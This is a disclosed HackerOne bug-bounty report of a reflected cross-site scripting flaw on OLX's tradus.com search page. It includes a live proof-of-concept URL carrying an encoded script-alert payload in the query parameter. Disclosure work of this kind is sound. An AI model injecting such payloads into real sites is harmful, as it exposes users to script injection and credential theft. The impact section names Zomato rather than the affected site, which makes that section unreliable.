@@ -1,0 +1,24 @@
+ReportLink:https://hackerone.com/reports/429647
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/secpentester1337
+ReportedTo:OLX(olx)
+BountyAmount:
+Severity:high
+State:Closed
+DateOfDisclosure:08.12.2018 9:59:15
+
+Summary:
+
+I have Found XSS payload avaliable at GET Request..
+
+Live PoC URL:
+
+https://www.tradus.com/en/s/braem-used-parts/make-man+mercedes-benz+zf+other+fuller/location-belgium+netherlands+germany+poland+denmark+france+united-kingdom+spain+sweden+italy+austria+finland+norway+ukraine+russia+czechia+greece+romania+hungary+portugal+belarus+switzerland+slovakia+united-arab-emirates+bulgaria+lithuania+ireland+latvia+turkey+croatia+estonia+vietnam+bosnia-herzegovina+slovenia+india+china+andorra+iceland+macedonia+mongolia+united-states+brazil+hong-kong-sar-china+israel+serbia/pricetype-fixed+upon-request/?query=%3Cscript%3Ealert%281337%29%3C%2Fscript%3E&year_from=09&year_to=09&price_from=1234&price_to=1234
+
+Tested with old version Firefox, where avaliable and disable XSS filter.
+
+## Impact
+
+Impact
+
+This allows an attacker to inject custom Javascript codes that can be used to steal information from Zomato's user base and lure them to malicious websites on the internet on behalf of Zomato's website.
